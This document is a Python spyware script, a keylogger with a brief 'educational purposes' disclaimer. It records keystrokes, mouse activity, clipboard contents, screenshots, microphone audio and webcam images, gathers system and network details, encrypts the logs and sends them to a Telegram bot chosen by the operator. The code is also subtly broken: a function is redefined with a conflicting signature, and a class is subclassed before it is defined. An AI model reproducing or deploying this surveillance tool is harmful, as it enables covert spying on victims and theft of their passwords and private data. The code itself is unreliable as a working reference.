# DISCLAIMER
# This script is for educational purposes only. Use it responsibly and ethically.
# Ensure you have permission to run this script on the system,
# and that its operation complies with all relevant laws and regulations.


# Standard library imports for network communication and system-level operations.
import socket  # Provides access to the BSD socket interface for networking.
import platform  # Access to underlying platform’s identifying data.

# Third-party import for interacting with the clipboard.
import pyperclip # Allows Python code to access the clipboard.

# Imports from the pynput library to capture keyboard and mouse events.
from pynput.keyboard import Listener as KeyListener  # Listener for keyboard events.
from pynput.mouse import Listener as MouseListener  # Listener for mouse events.

# Import threading for running different parts of the application concurrently.
import threading  # Enables the creation of threads for parallel execution.

# Import time for time-related functions.
import time  # Provides various time-related functions.

# Import from cryptography for encryption and decryption of logs.
from cryptography.fernet import Fernet  # Cryptographic recipes and primitives.

# Import get from requests for making HTTP requests (unused in this snippet).
from requests import get  # Simplifies making HTTP GET requests.

# Import pyautogui for programmatically controlling the mouse and keyboard.
import pyautogui  # GUI automation to simulate user interaction.

# Import psutil for retrieving system information and process management.
import psutil  # Provides an interface for retrieving information on system utilization.

# Import requests for making HTTP requests.
import requests  # Elegant and simple HTTP library for Python, built for human beings.

import sounddevice as sd  # For recording audio from the microphone

import numpy as np  # For handling audio data

import scipy.io.wavfile as wav  # For saving recorded audio to a WAV file

import cv2  # For capturing images from the webcam



# File paths and settings
keys_information = "key_log.txt"
mouse_information = "mouse_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
file_path = "/Users/yourusername/PycharmProjects/KeyLogger/"
extend = "/"
SEND_REPORT_EVERY = 60
audio_information = "audio.wav"
webcam_information = "webcam.jpg"
aggregated_info = "aggregated_info.txt"
encryption_key_file = file_path + extend + 'encryption_key.key'

# Telegram settings
telegram_token = 'your_telegram_bot_token'  # Replace with your token
telegram_chat_id = 'your_chat_id'  # Replace with your chat ID

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
        data = {
            "chat_id": telegram_chat_id,
            "text": message
        }
        response = requests.post(url, data=data)
        response.raise_for_status()
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# Global flag for thread termination
stop_threads = False

# Function Definitions
def generate_encryption_key():
    key = Fernet.generate_key()
    with open(file_path + extend + 'filekey.key', 'wb') as filekey:
        filekey.write(key)
    return key

def encrypt_file(file_name, key):
    try:
        fernet = Fernet(key)
        with open(file_name, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    except Exception as e:
        print(f"Error encrypting file {file_name}: {e}")

def gather_system_information(file_name, key):
    try:
        with open(file_name, "w") as f:
            hostname = socket.gethostname()
            IP_address = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except Exception:
                f.write("Couldn't get Public IP Address\n")

            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IP_address + '\n')

            # Network information
            f.write("Network Information:\n")
            for interface, addrs in psutil.net_if_addrs().items():
                f.write(f"  Interface {interface}:\n")
                for addr in addrs:
                    f.write(f"    Address: {addr.address}\n")
                    if addr.netmask:
                        f.write(f"    Netmask: {addr.netmask}\n")
                    if addr.broadcast:
                        f.write(f"    Broadcast: {addr.broadcast}\n")

            # Active connections
            f.write("Current Network Connections:\n")
            for conn in psutil.net_connections(kind='inet'):
                f.write(f"  Local Address: {conn.laddr}\n")
                if conn.raddr:
                    f.write(f"  Remote Address: {conn.raddr}\n")
                f.write(f"  Status: {conn.status}\n")
            
            encrypt_file(file_name, key)
    except Exception as e:
        print(f"Error gathering system information: {e}")

def log_clipboard(file_name, key):
    try:
        with open(file_name, "w") as f:
            pasted_data = pyperclip.paste()
            f.write("Clipboard Data: \n" + pasted_data)
        encrypt_file(file_name, key)
    except Exception as e:
        print(f"Error logging clipboard data: {e}")

def aggregate_data(key):
    try:
        with open(file_path + extend + 'aggregated_info.txt', 'w') as f:
            for filename in [system_information, clipboard_information, keys_information, mouse_information, screenshot_information]:
                f.write('\n----- ' + filename + ' -----\n')
                with open(file_path + extend + filename, 'r') as infile:
                    f.write(infile.read())
                    f.write('\n\n')
        encrypt_file(file_path + extend + 'aggregated_info.txt', key)

        # Sending message via Telegram
        with open(file_path + extend + 'aggregated_info.txt', 'r') as file:
            message_content = file.read()
        send_telegram_message(message_content)

    except Exception as e:
        print(f"Error in aggregate_data: {e}")
        
def record_audio(file_name, duration, fs=44100):
    print("Recording audio")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='float64')
    sd.wait()  # Wait until recording is finished
    wav.write(file_name, fs, recording)  # Save as WAV file
    print(f"Audio recording saved to {file_name}")
    encrypt_file(file_name, encryption_key)  # Encrypt the audio file
    
def capture_webcam(file_name):
    print("Capturing webcam image")
    cam = cv2.VideoCapture(0)  # Initialize the webcam
    ret, frame = cam.read()  # Read a frame
    if ret:
        cv2.imwrite(file_name, frame)  # Save the frame as an image file
        print(f"Webcam image saved to {file_name}")
        encrypt_file(file_name, encryption_key)  # Encrypt the image file
    cam.release()

def load_or_generate_key():
    try:
        with open(encryption_key_file, 'rb') as filekey:
            key = filekey.read()
    except FileNotFoundError:
        key = Fernet.generate_key()
        with open(encryption_key_file, 'wb') as filekey:
            filekey.write(key)
    return key

encryption_key = load_or_generate_key()  # Load or generate key at the start

# Encrypt function now uses the loaded/generated key
def encrypt_file(file_name):
    fernet = Fernet(encryption_key)
    with open(file_name, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_name, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Decryption function for demonstration, ensure secure key handling
def decrypt_file(file_name):
    fernet = Fernet(encryption_key)
    with open(file_name, 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file_name, 'wb') as dec_file:
        dec_file.write(decrypted)

# Updating the ScreenCapture class to include a capture method for the webcam
class EnhancedScreenCapture(ScreenCapture):
    def capture_webcam(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        webcam_filename = f"webcam_{timestamp}.jpg"
        capture_webcam(self.file_path + webcam_filename)

class KeyLogger:
    def __init__(self, log_file, key):
        self.log_file = log_file
        self.key = key
        self.keys = []

    def on_press(self, key):
        self.keys.append(str(key).replace("'", ""))
        self.write_file()

    def write_file(self):
        with open(self.log_file, "a") as f:
            for key in self.keys:
                f.write(f"{key}\n")
        self.keys = []
        encrypt_file(self.log_file, self.key)

    def start(self):
        with KeyListener(on_press=self.on_press) as listener:
            while not stop_threads:
                listener.join(timeout=1)

class MouseLogger:
    def __init__(self, log_file, key):
        self.log_file = log_file
        self.key = key

    def on_move(self, x, y):
        with open(self.log_file, "a") as f:
            f.write(f"Mouse moved to ({x}, {y})\n")
        encrypt_file(self.log_file, self.key)

    def on_click(self, x, y, button, pressed):
        with open(self.log_file, "a") as f:
            action = 'pressed' if pressed else 'released'
            f.write(f"Mouse {action} at ({x}, {y}) with {button}\n")
        encrypt_file(self.log_file, self.key)

    def start(self):
        with MouseListener(on_move=self.on_move, on_click=self.on_click) as listener:
            while not stop_threads:
                listener.join(timeout=1)

class ScreenCapture:
    def __init__(self, file_path, interval, duration, key):
        self.file_path = file_path
        self.interval = interval
        self.duration = duration
        self.key = key

    def capture(self):
        start_time = time.time()
        while (time.time() - start_time) < self.duration and not stop_threads:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot_filename = f"screenshot_{timestamp}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(self.file_path + screenshot_filename)
            encrypt_file(self.file_path + screenshot_filename, self.key)
            time.sleep(self.interval)


if __name__ == "__main__":
    print("Starting keylogger with advanced data collection. Press Ctrl+C to stop.")
    try:
        file_path = "path/to/your/directory"  # Define the base path for saving files
        extend = "/file_prefix"  # A prefix or extension for organizing files
        system_information = "system_info.txt"
        clipboard_information = "clipboard.txt"
        keys_information = "keystrokes.txt"
        mouse_information = "mouse_log.txt"
        audio_information = "audio.wav"
        SEND_REPORT_EVERY = 120  # Time interval in seconds for sending reports or aggregating data

        encryption_key = generate_encryption_key()
        gather_system_information(file_path + extend + system_information, encryption_key)
        log_clipboard(file_path + extend + clipboard_information, encryption_key)

        # Start the keylogger and mouselogger threads
        keylogger = KeyLogger(file_path + extend + keys_information, encryption_key)
        keylogger_thread = threading.Thread(target=keylogger.start)
        keylogger_thread.start()

        mouselogger = MouseLogger(file_path + extend + mouse_information, encryption_key)
        mouselogger_thread = threading.Thread(target=mouselogger.start)
        mouselogger_thread.start()

        # Start the screen capture thread with enhanced capabilities
        screen_capturer = EnhancedScreenCapture(file_path + extend, 5, 60, encryption_key)
        screen_capture_thread = threading.Thread(target=screen_capturer.capture)
        screen_capture_thread.start()

        # Record audio and capture webcam at intervals
        audio_duration = 10  # Duration for audio recording in seconds
        while True:
            record_audio(file_path + extend + audio_information, audio_duration, encryption_key)
            screen_capturer.capture_webcam()  # Capture a webcam image
            time.sleep(SEND_REPORT_EVERY)
            aggregate_data(encryption_key)

    except KeyboardInterrupt:
        stop_threads = True
        print("Shutting down...")
        keylogger_thread.join()
        mouselogger_thread.join()
        screen_capture_thread.join()
        print("Shutdown complete.")
